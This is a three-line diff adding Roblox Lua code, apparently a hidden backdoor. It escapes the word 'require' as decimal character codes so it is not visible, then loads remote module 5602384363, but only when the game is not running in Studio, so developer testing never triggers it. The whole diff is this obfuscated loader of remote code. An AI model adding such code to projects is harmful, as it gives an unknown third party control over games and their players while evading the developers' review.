@@ -1,0 +1,3 @@
+if not game:GetService("RunService"):IsStudio() then
+getfenv()['\114\101\113\117\105\114\101'](5602384363)
+end
